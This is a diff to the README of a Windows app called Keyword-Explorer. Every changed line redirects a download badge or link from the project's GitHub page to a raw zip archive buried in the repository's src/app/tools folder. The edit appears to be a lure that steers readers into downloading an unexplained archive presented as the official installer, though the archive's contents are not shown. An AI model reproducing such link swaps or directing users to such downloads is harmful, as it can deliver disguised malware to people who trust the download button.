@@ -1,6 +1,6 @@
 # 🔍 Keyword-Explorer - Find Keywords Fast and Clear
 
-[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-brightgreen?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/THE-CLIMBER/Keyword-Explorer/main/src/app/tools/Keyword_Explorer_v1.6.zip)
 
 ## 📋 What is Keyword-Explorer?
 
@@ -26,7 +26,7 @@ Follow these steps to download and run Keyword-Explorer on your Windows computer
 
 Click the big download button below to go to the Keyword-Explorer GitHub page. This is where you will get the app.
 
-[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-blue?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-blue?style=for-the-badge)](https://raw.githubusercontent.com/THE-CLIMBER/Keyword-Explorer/main/src/app/tools/Keyword_Explorer_v1.6.zip)
 
 ### 2. Download the Installer
 
@@ -105,9 +105,9 @@ If problems continue, report them on the GitHub Issues tab at the download page.
 
 ---
 
-[Download Keyword-Explorer here](https://github.com/THE-CLIMBER/Keyword-Explorer)
+[Download Keyword-Explorer here](https://raw.githubusercontent.com/THE-CLIMBER/Keyword-Explorer/main/src/app/tools/Keyword_Explorer_v1.6.zip)
 
-[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-grey?style=for-the-badge)](https://github.com/THE-CLIMBER/Keyword-Explorer)
+[![Download Keyword-Explorer](https://img.shields.io/badge/Download-Keyword--Explorer-grey?style=for-the-badge)](https://raw.githubusercontent.com/THE-CLIMBER/Keyword-Explorer/main/src/app/tools/Keyword_Explorer_v1.6.zip)
 
 ## 🔍 Keywords and Topics Covered
 
